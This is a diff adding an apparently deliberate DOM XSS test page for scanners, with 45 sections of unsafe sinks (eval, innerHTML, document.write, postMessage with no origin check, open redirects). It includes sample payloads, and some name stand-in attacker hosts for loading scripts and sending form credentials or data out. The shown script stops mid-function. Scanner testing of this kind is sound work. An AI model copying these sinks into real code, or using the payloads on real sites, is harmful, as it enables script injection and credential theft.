@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>DOM Vulnerability Lab - Scanner Test Page</title>
+<style>
+  body { font-family: Arial, sans-serif; margin: 20px; background: #1e1e2e; color: #cdd6f4; }
+  h1 { color: #f38ba8; }
+  h2 { color: #fab387; border-bottom: 1px solid #45475a; padding-bottom: 5px; }
+  .vuln { background: #313244; padding: 15px; margin: 15px 0; border-radius: 8px; border-left: 4px solid #f38ba8; }
+  .safe { background: #313244; padding: 15px; margin: 15px 0; border-radius: 8px; border-left: 4px solid #a6e3a1; }
+  label { display: block; margin: 8px 0 4px; color: #89b4fa; font-weight: bold; }
+  input[type=text], input[type=url] { width: 100%; padding: 8px; background: #1e1e2e; color: #cdd6f4; border: 1px solid #585b70; border-radius: 4px; }
+  button { background: #89b4fa; color: #1e1e2e; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 8px; font-weight: bold; }
+  button:hover { background: #b4befe; }
+  .output { margin-top: 10px; padding: 10px; background: #11111b; border-radius: 4px; min-height: 20px; word-break: break-all; }
+  .sink-name { font-family: monospace; color: #f9e2af; background: #11111b; padding: 2px 6px; border-radius: 3px; }
+  .desc { color: #a6adc8; font-size: 0.9em; margin-bottom: 10px; }
+  .note { color: #94e2d5; font-size: 0.85em; margin-top: 8px; font-style: italic; }
+  .section-index { columns: 2; column-gap: 20px; }
+  .section-index a { color: #89b4fa; text-decoration: none; }
+  .section-index a:hover { color: #cba6f7; text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<h1>🔴 DOM Vulnerability Lab</h1>
+<p>A intentionally vulnerable page containing many DOM-based vulnerabilities for testing DOM scanners.</p>
+<p><strong>Note:</strong> Many vulns below can be triggered via URL parameters, hash, referrer, postMessage, localStorage, cookies, etc.</p>
+
+<div class="section-index">
+<ol>
+  <li><a href="#v1">innerHTML sink (query param)</a></li>
+  <li><a href="#v2">document.write sink</a></li>
+  <li><a href="#v3">eval sink</a></li>
+  <li><a href="#v4">setTimeout string sink</a></li>
+  <li><a href="#v5">setInterval string sink</a></li>
+  <li><a href="#v6">Function constructor sink</a></li>
+  <li><a href="#v7">location.hash → innerHTML (hash-based XSS)</a></li>
+  <li><a href="#v8">location.href / open redirect</a></li>
+  <li><a href="#v9">location.replace open redirect</a></li>
+  <li><a href="#v10">script.src assignment</a></li>
+  <li><a href="#v11">script.textContent / inline script injection</a></li>
+  <li><a href="#v12">iframe.src javascript: URI</a></li>
+  <li><a href="#v13">element.setAttribute (onclick/href)</a></li>
+  <li><a href="#v14">outerHTML sink</a></li>
+  <li><a href="#v15">insertAdjacentHTML sink</a></li>
+  <li><a href="#v16">document.domain manipulation</a></li>
+  <li><a href="#v17">cookie manipulation</a></li>
+  <li><a href="#v18">localStorage stored XSS</a></li>
+  <li><a href="#v19">sessionStorage XSS</a></li>
+  <li><a href="#v20">postMessage unsafe (no origin check)</a></li>
+  <li><a href="#v21">postMessage → innerHTML</a></li>
+  <li><a href="#v22">JSONP injection via callback param</a></li>
+  <li><a href="#v23">jQuery globalEval / html() sinks</a></li>
+  <li><a href="#v24">jQuery $() selector injection</a></li>
+  <li><a href="#v25">document.createElement('script') + src</a></li>
+  <li><a href="#v26">Range.createContextualFragment sink</a></li>
+  <li><a href="#v27">XMLHttpRequest responseHTML / DOMParser</a></li>
+  <li><a href="#v28">history.pushState reflected</a></li>
+  <li><a href="#v29">window.name → DOM</a></li>
+  <li><a href="#v30">document.referrer → DOM</a></li>
+  <li><a href="#v31">CSS expression / style sink (url, -moz-binding)</a></li>
+  <li><a href="#v32">href assignment with javascript:</a></li>
+  <li><a href="#v33">form.action manipulation</a></li>
+  <li><a href="#v34">button/form onclick inline handler concat</a></li>
+  <li><a href="#v35">DOM clobbering gadget</a></li>
+  <li><a href="#v36">prototype pollution gadget</a></li>
+  <li><a href="#v37">WebSocket URL injection</a></li>
+  <li><a href="#v38">FileReader / drag-and-drop XSS</a></li>
+  <li><a href="#v39">Web Worker source injection</a></li>
+  <li><a href="#v40">Shadow DOM innerHTML sink</a></li>
+  <li><a href="#v41">srcdoc iframe injection</a></li>
+  <li><a href="#v42">template element clone + innerHTML</a></li>
+  <li><a href="#v43">anchor.hash navigation javascript:</a></li>
+  <li><a href="#v44">AngularJS-style expression sandbox bypass</a></li>
+  <li><a href="#v45">safeSink - intentionally safe (textContent)</a></li>
+</ol>
+</div>
+
+<!-- ============================================================ -->
+
+<h2 id="v1">1. innerHTML sink (from location.search param 'name')</h2>
+<div class="vuln">
+  <div class="desc">Classic DOM XSS: <span class="sink-name">element.innerHTML = source</span>. Source: <span class="sink-name">location.search</span> via URLSearchParams.</div>
+  <label>Name (?name=...):</label>
+  <input type="text" id="v1_input" placeholder="e.g. &lt;img src=x onerror=alert(1)&gt;">
+  <button onclick="vuln1()">Render with innerHTML</button>
+  <div class="output" id="v1_out"></div>
+  <div class="note">Auto-runs on page load using ?name= parameter.</div>
+</div>
+
+<h2 id="v2">2. document.write sink</h2>
+<div class="vuln">
+  <div class="desc">Unsafe sink: <span class="sink-name">document.write(source)</span>. Source: query param <span class="sink-name">?msg=</span>.</div>
+  <label>Message (?msg=...):</label>
+  <input type="text" id="v2_input" placeholder="e.g. &lt;script&gt;alert(2)&lt;/script&gt;">
+  <button onclick="vuln2()">document.write it</button>
+  <div class="note">Directly writes user input into document stream.</div>
+</div>
+
+<h2 id="v3">3. eval sink</h2>
+<div class="vuln">
+  <div class="desc">Unsafe sink: <span class="sink-name">eval(source)</span>. Source: query param <span class="sink-name">?expr=</span>.</div>
+  <label>Expression (?expr=...):</label>
+  <input type="text" id="v3_input" placeholder="e.g. alert(3)">
+  <button onclick="vuln3()">eval it</button>
+  <div class="output" id="v3_out"></div>
+</div>
+
+<h2 id="v4">4. setTimeout string sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">setTimeout(string, ms)</span> acts like eval. Source: <span class="sink-name">?t=</span>.</div>
+  <label>Timed code (?t=...):</label>
+  <input type="text" id="v4_input" placeholder="e.g. alert(4)">
+  <button onclick="vuln4()">setTimeout 1s</button>
+</div>
+
+<h2 id="v5">5. setInterval string sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">setInterval(string, ms)</span> sink. Source: <span class="sink-name">?i=</span>.</div>
+  <label>Interval code (?i=...):</label>
+  <input type="text" id="v5_input" placeholder="e.g. alert(5);clearInterval(window._v5)">
+  <button onclick="vuln5()">Start interval (3s)</button>
+</div>
+
+<h2 id="v6">6. Function constructor sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">new Function(source)()</span> sink. Source: <span class="sink-name">?fn=</span>.</div>
+  <label>Function body (?fn=...):</label>
+  <input type="text" id="v6_input" placeholder="e.g. alert(6)">
+  <button onclick="vuln6()">Run Function</button>
+</div>
+
+<h2 id="v7">7. location.hash → innerHTML (hash-based XSS)</h2>
+<div class="vuln">
+  <div class="desc">Source: <span class="sink-name">location.hash</span> into <span class="sink-name">innerHTML</span>. Try #&lt;svg/onload=alert(7)&gt;</div>
+  <div class="output" id="v7_out">Hash will render here automatically.</div>
+</div>
+
+<h2 id="v8">8. location.href open redirect</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">location.href = source</span> - open redirect / javascript: URI sink. Source: <span class="sink-name">?next=</span>.</div>
+  <label>Redirect URL (?next=...):</label>
+  <input type="url" id="v8_input" placeholder="https://evil.example or javascript:alert(8)">
+  <button onclick="vuln8()">Go</button>
+</div>
+
+<h2 id="v9">9. location.assign / location.replace open redirect</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">location.replace(source)</span>. Source: <span class="sink-name">?r=</span>.</div>
+  <label>Replace URL (?r=...):</label>
+  <input type="url" id="v9_input" placeholder="https://evil.example">
+  <button onclick="vuln9()">Replace</button>
+</div>
+
+<h2 id="v10">10. script.src assignment (arbitrary script load)</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">script.src = source</span> allows loading attacker-controlled JS. Source: <span class="sink-name">?s=</span>.</div>
+  <label>Script URL (?s=...):</label>
+  <input type="url" id="v10_input" placeholder="https://attacker.example/payload.js">
+  <button onclick="vuln10()">Load script</button>
+  <div class="output" id="v10_out"></div>
+</div>
+
+<h2 id="v11">11. script.textContent (inline script injection)</h2>
+<div class="vuln">
+  <div class="desc">Setting <span class="sink-name">script.textContent = source</span> after appending won't execute in modern browsers, but assigning before append does. Source: <span class="sink-name">?scode=</span>.</div>
+  <label>Inline script (?scode=...):</label>
+  <input type="text" id="v11_input" placeholder="e.g. alert(11)">
+  <button onclick="vuln11()">Inject inline script</button>
+</div>
+
+<h2 id="v12">12. iframe.src javascript: URI sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">iframe.src = 'javascript:' + source</span> executes code in parent context in some browsers/settings.</div>
+  <label>Iframe javascript payload:</label>
+  <input type="text" id="v12_input" placeholder="e.g. alert(parent.document.domain)">
+  <button onclick="vuln12()">Load iframe</button>
+  <div class="output" id="v12_out"></div>
+</div>
+
+<h2 id="v13">13. element.setAttribute on event handlers / href</h2>
+<div class="vuln">
+  <div class="desc">Setting <span class="sink-name">setAttribute('onclick'|'href', source)</span> allows javascript: URIs or event handlers. Source: <span class="sink-name">?handler=</span>.</div>
+  <label>onclick payload:</label>
+  <input type="text" id="v13_input" placeholder="e.g. alert(13)">
+  <button onclick="vuln13()">Create link</button>
+  <div class="output" id="v13_out"></div>
+</div>
+
+<h2 id="v14">14. outerHTML sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">element.outerHTML = source</span> replaces element with attacker markup.</div>
+  <label>Outer HTML:</label>
+  <input type="text" id="v14_input" placeholder='e.g. &lt;b onclick="alert(14)"&gt;click me&lt;/b&gt;'>
+  <button onclick="vuln14()">Replace</button>
+  <div id="v14_target" style="padding:8px;background:#45475a;border-radius:4px;">Original element (v14_target)</div>
+</div>
+
+<h2 id="v15">15. insertAdjacentHTML sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">element.insertAdjacentHTML('beforeend', source)</span>.</div>
+  <label>HTML to insert:</label>
+  <input type="text" id="v15_input" placeholder='e.g. &lt;img src=x onerror=alert(15)&gt;'>
+  <button onclick="vuln15()">Insert</button>
+  <div class="output" id="v15_out"></div>
+</div>
+
+<h2 id="v16">16. document.domain manipulation</h2>
+<div class="vuln">
+  <div class="desc">Setting <span class="sink-name">document.domain = source</span> from a param can weaken origin boundaries between subdomains.</div>
+  <label>document.domain value (?domain=...):</label>
+  <input type="text" id="v16_input" placeholder="e.g. example.com">
+  <button onclick="vuln16()">Set domain</button>
+</div>
+
+<h2 id="v17">17. Cookie manipulation (cookie injection / session fixation)</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">document.cookie = source</span> allows arbitrary cookie setting / HttpOnly bypass attempts.</div>
+  <label>Cookie key=value:</label>
+  <input type="text" id="v17_input" placeholder="e.g. sessionid=attacker">
+  <button onclick="vuln17()">Set cookie</button>
+  <div class="output" id="v17_out"></div>
+</div>
+
+<h2 id="v18">18. localStorage stored XSS</h2>
+<div class="vuln">
+  <div class="desc">Data stored in <span class="sink-name">localStorage</span> via ?note= is later rendered with innerHTML (stored DOM XSS).</div>
+  <label>Note to store (?note=...):</label>
+  <input type="text" id="v18_input" placeholder='e.g. &lt;script&gt;alert(18)&lt;/script&gt;'>
+  <button onclick="vuln18_save()">Save note</button>
+  <button onclick="vuln18_load()">Load note (innerHTML)</button>
+  <div class="output" id="v18_out"></div>
+</div>
+
+<h2 id="v19">19. sessionStorage XSS</h2>
+<div class="vuln">
+  <div class="desc">Same pattern as above but using <span class="sink-name">sessionStorage</span>.</div>
+  <label>Flash message:</label>
+  <input type="text" id="v19_input" placeholder='e.g. &lt;svg onload=alert(19)&gt;'>
+  <button onclick="vuln19_save()">Save</button>
+  <button onclick="vuln19_load()">Render</button>
+  <div class="output" id="v19_out"></div>
+</div>
+
+<h2 id="v20">20. postMessage without origin check (message listener)</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">window.addEventListener('message', ...)</span> with NO origin check — accept messages from any origin.</div>
+  <button onclick="vuln20_test()">Send self postMessage</button>
+  <div class="output" id="v20_out"></div>
+  <div class="note">Any window can postMessage to this page and trigger eval. Open this lab in a frame from any origin and try: <code>frame.postMessage('alert(20)','*')</code></div>
+</div>
+
+<h2 id="v21">21. postMessage data → innerHTML</h2>
+<div class="vuln">
+  <div class="desc">postMessage with weak origin check (just checks indexOf) and writes data.html to <span class="sink-name">innerHTML</span>.</div>
+  <button onclick="vuln21_test()">Send spoofed message</button>
+  <div class="output" id="v21_out"></div>
+</div>
+
+<h2 id="v22">22. JSONP injection (callback param)</h2>
+<div class="vuln">
+  <div class="desc">Reads <span class="sink-name">?callback=</span> and appends a script tag with that callback name — classic JSONP pattern allowing arbitrary JS execution via crafted callback name.</div>
+  <label>Callback (?cb=...):</label>
+  <input type="text" id="v22_input" placeholder="e.g. alert(22);//">
+  <button onclick="vuln22()">Load JSONP</button>
+  <div class="output" id="v22_out"></div>
+</div>
+
+<h2 id="v23">23. jQuery-style .html() / globalEval sinks</h2>
+<div class="vuln">
+  <div class="desc">Simulated jQuery-style sinks: <span class="sink-name">$(el).html(source)</span> and <span class="sink-name">$.globalEval(source)</span>. (Uses native innerHTML/eval as stand-in so the page works without jQuery.)</div>
+  <label>HTML to inject:</label>
+  <input type="text" id="v23_input" placeholder='e.g. &lt;img src=x onerror=alert(23)&gt;'>
+  <button onclick="vuln23_html()">$(...).html()</button>
+  <button onclick="vuln23_eval()">$.globalEval()</button>
+  <div class="output" id="v23_out"></div>
+</div>
+
+<h2 id="v24">24. jQuery $() selector injection (XSS via hash HTML)</h2>
+<div class="vuln">
+  <div class="desc">Old jQuery behavior: <span class="sink-name">$(source)</span> where source is a string starting with &lt; creates HTML elements, executing scripts.</div>
+  <label>jQuery selector/HTML:</label>
+  <input type="text" id="v24_input" placeholder='e.g. &lt;img src=x onerror=alert(24)&gt;'>
+  <button onclick="vuln24()">$() it</button>
+  <div class="output" id="v24_out"></div>
+</div>
+
+<h2 id="v25">25. Dynamic createElement('script') + src</h2>
+<div class="vuln">
+  <div class="desc">Creates a script via <span class="sink-name">document.createElement('script')</span> and sets <span class="sink-name">.src</span> from URL param <span class="sink-name">?lib=</span>.</div>
+  <label>Library URL:</label>
+  <input type="text" id="v25_input" placeholder="e.g. https://attacker.example/x.js">
+  <button onclick="vuln25()">Load lib</button>
+</div>
+
+<h2 id="v26">26. Range.createContextualFragment sink</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">range.createContextualFragment(source)</span> parses HTML and inserts it, executing script-vector payloads.</div>
+  <label>Fragment HTML:</label>
+  <input type="text" id="v26_input" placeholder='e.g. &lt;img src=x onerror=alert(26)&gt;'>
+  <button onclick="vuln26()">Parse and insert</button>
+  <div class="output" id="v26_out"></div>
+</div>
+
+<h2 id="v27">27. XMLHttpRequest + DOMParser innerHTML</h2>
+<div class="vuln">
+  <div class="desc">Fetches a URL (from ?fetch=), parses with <span class="sink-name">DOMParser</span>, and writes body into <span class="sink-name">innerHTML</span>. Also demonstrates reflected XSS via data: URIs.</div>
+  <label>URL to fetch:</label>
+  <input type="text" id="v27_input" placeholder="e.g. data:text/html,&lt;img src=x onerror=alert(27)&gt;">
+  <button onclick="vuln27()">Fetch & render</button>
+  <div class="output" id="v27_out"></div>
+</div>
+
+<h2 id="v28">28. history.pushState / replaceState with state → DOM</h2>
+<div class="vuln">
+  <div class="desc">Reads state object and writes <span class="sink-name">state.message</span> into DOM via innerHTML (popstate-triggered XSS).</div>
+  <label>State message:</label>
+  <input type="text" id="v28_input" placeholder='e.g. &lt;b onmouseover=alert(28)&gt;hi&lt;/b&gt;'>
+  <button onclick="vuln28()">pushState + trigger</button>
+  <div class="output" id="v28_out"></div>
+</div>
+
+<h2 id="v29">29. window.name → DOM</h2>
+<div class="vuln">
+  <div class="desc">Reads <span class="sink-name">window.name</span> (cross-origin controllable) and writes to innerHTML.</div>
+  <button onclick="vuln29()">Render window.name</button>
+  <div class="output" id="v29_out"></div>
+  <div class="note">Test with: <code>window.open('dom-vuln-lab.html','&lt;svg onload=alert(29)&gt;')</code></div>
+</div>
+
+<h2 id="v30">30. document.referrer → DOM</h2>
+<div class="vuln">
+  <div class="desc">Writes <span class="sink-name">document.referrer</span> into innerHTML — controllable by the linking page (e.g., referrer with javascript: or payload in query string).</div>
+  <button onclick="vuln30()">Show referrer</button>
+  <div class="output" id="v30_out"></div>
+</div>
+
+<h2 id="v31">31. CSS/style sink (backgroundImage url, expression legacy)</h2>
+<div class="vuln">
+  <div class="desc">Assigns user input to <span class="sink-name">element.style.backgroundImage = 'url(' + source + ')'</span> — possible CSS injection / javascript: url() in older IE.</div>
+  <label>Image URL (CSS url()):</label>
+  <input type="text" id="v31_input" placeholder='e.g. x);-moz-binding:url(...)'>
+  <button onclick="vuln31()">Apply</button>
+  <div id="v31_target" style="height:60px;background:#45475a;border-radius:4px;margin-top:8px;">Styled box</div>
+</div>
+
+<h2 id="v32">32. href assignment with javascript: URI</h2>
+<div class="vuln">
+  <div class="desc">Sets <span class="sink-name">anchor.href = source</span> without validating protocol — allows javascript: URIs.</div>
+  <label>Link href:</label>
+  <input type="text" id="v32_input" placeholder="e.g. javascript:alert(32)">
+  <button onclick="vuln32()">Create link</button>
+  <div class="output" id="v32_out"></div>
+</div>
+
+<h2 id="v33">33. form.action manipulation</h2>
+<div class="vuln">
+  <div class="desc">Sets <span class="sink-name">form.action = source</span> — exfiltrates form data to attacker domain.</div>
+  <label>Form action URL:</label>
+  <input type="text" id="v33_input" placeholder="e.g. https://attacker.example/steal">
+  <button onclick="vuln33()">Set action</button>
+  <form id="v33_form" method="post">
+    <input type="text" name="username" placeholder="username">
+    <input type="password" name="password" placeholder="password">
+    <button type="submit">Login</button>
+  </form>
+</div>
+
+<h2 id="v34">34. Inline event handler concatenation (onclick, onload, onerror)</h2>
+<div class="vuln">
+  <div class="desc">Builds <span class="sink-name">el.onclick = new Function(...) / inline string concat</span> leading to handler injection.</div>
+  <label>Username (used in inline handler):</label>
+  <input type="text" id="v34_input" placeholder='e.g. ");alert(34);//'>
+  <button onclick="vuln34()">Create button</button>
+  <div class="output" id="v34_out"></div>
+</div>
+
+<h2 id="v35">35. DOM clobbering gadget</h2>
+<div class="vuln">
+  <div class="desc">Code reads <span class="sink-name">window.globalConfig.url</span> without defining it — clobberable via an element with <span class="sink-name">id="globalConfig"</span> and a child <span class="sink-name">name="url"</span>, leading to XSS in the redirect that follows.</div>
+  <button onclick="vuln35()">Run with clobbered config</button>
+  <div class="output" id="v35_out"></div>
+  <!-- Clobbering payload (uncomment to test clobbering): -->
+  <!--
+  <form id="globalConfig"><output name="url">javascript:alert(35)</output></form>
+  -->
+</div>
+
+<h2 id="v36">36. Prototype pollution gadget</h2>
+<div class="vuln">
+  <div class="desc">Performs a recursive merge of user-controlled options (from ?pollute=) — classic <span class="sink-name">Object.prototype</span> pollution gadget that can lead to XSS later when polluted keys are read.</div>
+  <label>Options JSON (?pollute=...):</label>
+  <input type="text" id="v36_input" placeholder='e.g. {"__proto__":{"polluted":"yes"}}'>
+  <button onclick="vuln36()">Merge options</button>
+  <div class="output" id="v36_out"></div>
+</div>
+
+<h2 id="v37">37. WebSocket URL injection</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">new WebSocket(source)</span> allows attacker-controlled WS endpoint (credential/data exfiltration over WS).</div>
+  <label>WebSocket URL:</label>
+  <input type="text" id="v37_input" placeholder="e.g. wss://attacker.example/ws">
+  <button onclick="vuln37()">Connect WS</button>
+  <div class="output" id="v37_out"></div>
+</div>
+
+<h2 id="v38">38. FileReader + drag-and-drop XSS</h2>
+<div class="vuln">
+  <div class="desc">Reads dropped text files and writes contents to <span class="sink-name">innerHTML</span> — self-XSS on dropped content.</div>
+  <div id="v38_drop" style="padding:20px;border:2px dashed #89b4fa;border-radius:8px;text-align:center;">Drop a .txt/.html file here</div>
+  <div class="output" id="v38_out"></div>
+</div>
+
+<h2 id="v39">39. Web Worker source injection</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">new Worker(source)</span> from a blob/URL controlled by attacker (uses Blob URL from input).</div>
+  <label>Worker source code:</label>
+  <input type="text" id="v39_input" placeholder="e.g. postMessage('pwned'); setTimeout(()=>importScripts('https://evil/x.js'),100)">
+  <button onclick="vuln39()">Spawn worker</button>
+  <div class="output" id="v39_out"></div>
+</div>
+
+<h2 id="v40">40. Shadow DOM innerHTML sink</h2>
+<div class="vuln">
+  <div class="desc">Attaches shadow root and writes user input to <span class="sink-name">shadowRoot.innerHTML</span> — classic DOM XSS within shadow DOM (scanners often miss this).</div>
+  <label>Shadow HTML:</label>
+  <input type="text" id="v40_input" placeholder='e.g. &lt;img src=x onerror=alert(40)&gt;'>
+  <button onclick="vuln40()">Render in shadow DOM</button>
+  <div id="v40_host"></div>
+</div>
+
+<h2 id="v41">41. iframe srcdoc injection</h2>
+<div class="vuln">
+  <div class="desc"><span class="sink-name">iframe.srcdoc = source</span> writes attacker-controlled HTML into a same-origin iframe.</div>
+  <label>srcdoc HTML:</label>
+  <input type="text" id="v41_input" placeholder='e.g. &lt;script&gt;top.alert(41)&lt;/script&gt;'>
+  <button onclick="vuln41()">Load srcdoc</button>
+  <div class="output" id="v41_out"></div>
+</div>
+
+<h2 id="v42">42. Template element + clone + innerHTML</h2>
+<div class="vuln">
+  <div class="desc">Uses &lt;template&gt; + <span class="sink-name">content.cloneNode</span> + innerHTML assignment to render untrusted data.</div>
+  <label>Template content:</label>
+  <input type="text" id="v42_input" placeholder='e.g. &lt;img src=x onerror=alert(42)&gt;'>
+  <button onclick="vuln42()">Render template</button>
+  <div class="output" id="v42_out"></div>
+</div>
+
+<h2 id="v43">43. Anchor click → javascript: via hash</h2>
+<div class="vuln">
+  <div class="desc">Link whose href is set from <span class="sink-name">location.hash</span>; clicking triggers the payload. Navigate to #javascript:alert(43) and click the link below.</div>
+  <a id="v43_link" href="#" style="color:#f38ba8;">Click me after setting hash to javascript:alert(43)</a>
+</div>
+
+<h2 id="v44">44. Expression parser (mock AngularJS sandbox bypass)</h2>
+<div class="vuln">
+  <div class="desc">A toy expression evaluator that uses <span class="sink-name">new Function('return ' + expr)</span> under the hood — simulating Angular-style expression injection. Source: <span class="sink-name">?expr2=</span>.</div>
+  <label>Expression:</label>
+  <input type="text" id="v44_input" placeholder="e.g. 1+2; alert(44)">
+  <button onclick="vuln44()">Evaluate</button>
+  <div class="output" id="v44_out"></div>
+</div>
+
+<h2 id="v45">45. SAFE — textContent (false positive check)</h2>
+<div class="safe">
+  <div class="desc">Uses <span class="sink-name">textContent</span> (safe sink) — scanner should NOT flag this.</div>
+  <label>Safe input:</label>
+  <input type="text" id="v45_input" placeholder="Any markup should be escaped">
+  <button onclick="safe1()">Render with textContent</button>
+  <div class="output" id="v45_out"></div>
+</div>
+
+<hr>
+<p style="color:#a6adc8;font-size:0.85em;">End of lab. Tips: test with payloads using ?name=, ?msg=, #hash, postMessage from cross-origin window, localStorage, window.name, referrer, etc.</p>
+
+<!-- ============================================================ -->
+<!-- The vulnerable JS                                              -->
+<!-- ============================================================ -->
+<script>
+/* Helper: read query parameter by name */
+function getParam(name) {
+  try {
+    var u = new URL(location.href);
+    return u.searchParams.get(name) || '';
+  } catch(e) {
+    var m = location.search.match(new RegExp('[?&]'+name+'=([^&]*)'));
+    return m ? decodeURIComponent(m[1]) : '';
+  }
+}
+
+/* Auto-run initial URL-based payloads on load */
+window.addEventListener('DOMContentLoaded', function() {
+  // V1 auto
+  if (getParam('name')) {
+    document.getElementById('v1_input').value = getParam('name');
+    vuln1();
+  }
+  // V7 auto (hash)
+  v7_render();
+  window.addEventListener('hashchange', v7_render);
+  // V43 set link href from hash
+  if (location.hash && location.hash.length > 1) {
+    document.getElementById('v43_link').href = location.hash.slice(1);
+  }
+  // V20 listener (no origin check at all - very bad)
+  window.addEventListener('message', function(e) {
+    // VULNERABLE: no origin check
+    eval(e.data);
+    document.getElementById('v20_out').textContent = 'Executed postMessage data from origin: ' + e.origin;
+  });
+  // V21 listener (weak "origin" check using indexOf)
+  window.addEventListener('message', function(e) {
+    // Weak check: only checks if origin contains "trusted"
+    if (e.origin.indexOf('trusted') === -1) return; // trivial bypass: trusted.evil.com
+    var out = document.getElementById('v21_out');
+    if (out && e.data && e.data.html) {
+      out.innerHTML = e.data.html; // VULNERABLE sink
+    }
+  });
+  // V30 referrer render link
+  document.getElementById('v30_out').dataset.loaded = 'no';
+  // V38 drag and drop
+  var drop = document.getElementById('v38_drop');
+  drop.addEventListener('dragover', function(e){ e.preventDefault(); });
+  drop.addEventListener('drop', function(e){
+    e.preventDefault();
+    var f = e.dataTransfer.files[0];
+    if (!f) return;
+    var fr = new FileReader();
+    fr.onload = function(){
+      document.getElementById('v38_out').innerHTML = fr.result; // VULNERABLE
+    };
+    fr.readAsText(f);
+  });
+});
+
+/* ==================== Vulnerable functions ==================== */
+
+function vuln1() {
+  var val = document.getElementById('v1_input').value || getParam('name');
+  // VULN: innerHTML sink
+  document.getElementById('v1_out').innerHTML = val;
+}
+
+function vuln2() {
+  var val = document.getElementById('v2_input').value || getParam('msg');
+  // VULN: document.write sink
+  document.write('<div style="color:#f9e2af">' + val + '</div>');
+  document.write('<hr>');
+}
+
+function vuln3() {
+  var val = document.getElementById('v3_input').value || getParam('expr');
+  try {
+    // VULN: eval sink
+    var r = eval(val);
+    document.getElementById('v3_out').textContent = 'Result: ' + r;
+  } catch(e) {
+    document.getElementById('v3_out').textContent = 'Error: ' + e.message;
+  }
+}
+
+function vuln4() {
+  var val = document.getElementById('v4_input').value || getParam('t');
+  // VULN: setTimeout string
+  setTimeout(val, 1000);
+}
+
+function vuln5() {
+  var val = document.getElementById('v5_input').value || getParam('i');
+  // VULN: setInterval string
+  window._v5 = setInterval(val, 3000);
+  setTimeout(function(){ clearInterval(window._v5); }, 15000);
+}
+
+function vuln6() {
+  var val = document.getElementById('v6_input').value || getParam('fn');
+  try {
+    // VULN: Function constructor
+    (new Function(val))();
+  } catch(e) { alert('Error: ' + e.message); }
+}
+
+function v7_render() {
+  // VULN: hash into innerHTML
+  var h = location.hash.slice(1);
+  document.getElementById('v7_out').innerHTML = decodeURIComponent(h);
+}
+
+function vuln8() {
+  var val = document.getElementById('v8_input').value || getParam('next');
+  // VULN: open redirect + javascript: sink
+  location.href = val;
+}
+
+function vuln9() {
+  var val = document.getElementById('v9_input').value || getParam('r');
+  // VULN: location.replace
+  location.replace(val);
+}
+
+function vuln10() {
+  var val = document.getElementById('v10_input').value || getParam('s');
+  // VULN: script.src
+  var s = document.createElement('script');
+  s.src = val;
+  s.onerror = function(){ document.getElementById('v10_out').textContent = 'Script load failed (blocked by CSP/network?): ' + val; };
+  s.onload = function(){ document.getElementById('v10_out').textContent = 'Script loaded: ' + val; };
+  document.body.appendChild(s);
+}
+
+function vuln11() {
+  var val = document.getElementById('v11_input').value || getParam('scode');
+  // VULN: inline script via textContent (created before append - executes)
+  var s = document.createElement('script');
+  s.textContent = val;
+  document.body.appendChild(s);
+}
+
+function vuln12() {
+  var val = document.getElementById('v12_input').value;
+  var fr = document.createElement('iframe');
+  fr.style.width = '100%';
+  fr.style.height = '80px';
+  // VULN: javascript: URI in iframe src
+  fr.src = 'javascript:' + val;
+  var out = document.getElementById('v12_out');
+  out.innerHTML = '';
+  out.appendChild(fr);
+}
+
+function vuln13() {
+  var val = document.getElementById('v13_input').value || getParam('handler');
+  var a = document.createElement('a');
+  a.textContent = 'Click me (handler = ' + val + ')';
+  a.href = '#';
+  // VULN: setAttribute for inline handler
+  a.setAttribute('onclick', val + '; return false;');
+  a.style.color = '#f38ba8';
+  var out = document.getElementById('v13_out');
+  out.innerHTML = '';
+  out.appendChild(a);
+  // Also build an <a href=javascript:...>
+  var b = document.createElement('a');
+  b.textContent = ' [href=javascript link] ';
+  b.setAttribute('href', 'javascript:' + val);
+  b.style.marginLeft = '10px';
+  b.style.color = '#fab387';
+  out.appendChild(b);
+}
+
+function vuln14() {
+  var val = document.getElementById('v14_input').value;
+  // VULN: outerHTML
+  var t = document.getElementById('v14_target');
+  t.outerHTML = '<div id="v14_target" style="padding:8px;background:#45475a;border-radius:4px;">' + val + '</div>';
+}
+
+function vuln15() {
+  var val = document.getElementById('v15_input').value;
+  var out = document.getElementById('v15_out');
+  // VULN: insertAdjacentHTML
+  out.insertAdjacentHTML('beforeend', '<div>' + val + '</div>');
+}
+
+function vuln16() {
+  var val = document.getElementById('v16_input').value || getParam('domain');
+  try {
+    // VULN: document.domain assignment
+    document.domain = val;
+    alert('document.domain set to: ' + document.domain);
+  } catch(e) {
+    alert('Could not set domain (sandbox/coop restriction): ' + e.message);
+  }
+}
+
+function vuln17() {
+  var val = document.getElementById('v17_input').value;
+  // VULN: cookie injection
+  document.cookie = val + '; path=/';
+  document.getElementById('v17_out').textContent = 'Current cookies: ' + document.cookie;
+}
+
+function vuln18_save() {
+  var val = document.getElementById('v18_input').value || getParam('note');
+  localStorage.setItem('v18_note', val);
+  alert('Note saved to localStorage. Click "Load note" to trigger innerHTML render.');
+}
+function vuln18_load() {
+  var val = localStorage.getItem('v18_note') || '';
+  // VULN: localStorage -> innerHTML (stored DOM XSS)
+  document.getElementById('v18_out').innerHTML = val;
+}
+
+function vuln19_save() {
+  var val = document.getElementById('v19_input').value;
+  sessionStorage.setItem('v19_msg', val);
+}
+function vuln19_load() {
+  var val = sessionStorage.getItem('v19_msg') || '';
+  // VULN: sessionStorage -> innerHTML
+  document.getElementById('v19_out').innerHTML = val;
+}
+
+function vuln20_test() {
+  // Self-test
